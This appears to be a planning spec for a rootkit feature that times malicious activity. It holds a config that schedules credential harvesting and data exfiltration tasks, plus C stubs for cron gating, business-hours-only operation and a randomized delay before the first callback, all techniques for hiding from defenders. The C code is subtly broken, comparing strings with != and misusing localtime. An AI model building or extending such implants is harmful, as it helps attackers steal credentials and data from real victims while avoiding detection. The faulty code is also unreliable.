# F0224: Time-Based Execution

## Metadata
| Field | Value |
|---|---|
| ID | F0224 |
| Priority | Medium |
| Status | Planned |
| MVP Phase | v2 |
| Depends on | F0200, F0205 |

## Summary
Control rootkit activity based on time schedules including cron-style scheduling, business hours operation, delay-on-first-run, and time synchronization.

## Scheduled Task Execution

```json
{
  "scheduled_tasks": [
    {
      "name": "harvest_credentials",
      "module": "credential_harvest",
      "schedule": "0 2 * * *",
      "enabled": true
    },
    {
      "name": "exfiltrate_data",
      "module": "file_transfer",
      "schedule": "0 */6 * * 1-5",
      "enabled": true
    }
  ]
}
```

```c
bool should_run_task(cron_schedule_t *schedule) {
    struct tm *now = localtime(time(NULL));

    // Parse cron expression: minute hour day month weekday
    if (schedule->minute != "*" && now->tm_min != parse_int(schedule->minute)) {
        return false;
    }
    if (schedule->hour != "*" && now->tm_hour != parse_int(schedule->hour)) {
        return false;
    }
    // ... check day, month, weekday

    return true;
}
```

## Business Hours Operation

```c
bool is_business_hours() {
    struct tm *now = localtime(time(NULL));

    // 8 AM - 6 PM, Monday-Friday
    if (now->tm_wday == 0 || now->tm_wday == 6) {
        return false; // Weekend
    }
    if (now->tm_hour < 8 || now->tm_hour >= 18) {
        return false; // Outside hours
    }

    return true;
}
```

## Delay-on-First-Run

```c
void delay_first_callback() {
    time_t first_run = get_first_run_time();
    time_t now = time(NULL);
    time_t delay = config.delay_seconds + random(0, config.delay_variance);

    if (difftime(now, first_run) < delay) {
        sleep(config.poll_interval);
    }
}
```

## Stages

### Stage 1: Cron Scheduling
- [ ] Cron expression parser
- [ ] Scheduled task execution
- [ ] Task enable/disable

### Stage 2: Business Hours
- [ ] Configurable work hours
- [ ] Weekend detection
- [ ] Holiday calendar support

### Stage 3: Delay Execution
- [ ] Configurable delay (1-7 days)
- [ ] Randomized delay
- [ ] Gradual activity ramp-up

### Stage 4: Time Sync
- [ ] NTP verification
- [ ] Timezone detection
- [ ] Fallback to system time

## Feature Acceptance Criteria
- [ ] Tasks execute at scheduled times
- [ ] Business hours filtering works
- [ ] Delay-on-first-run delays callback
- [ ] NTP sync corrects time drift

## Test Plan

### Unit Tests
- [ ] test_cron_parser_valid_expressions
- [ ] test_is_business_hours_weekend
- [ ] test_delay_calculation

### System Tests
- [ ] Schedule task; verify execution at time
- [ ] Set outside business hours; verify no activity
- [ ] First run; verify delay before callback

### Playwright Tests
- [ ] Configure scheduled tasks in UI
- [ ] Set business hours
- [ ] View task execution history
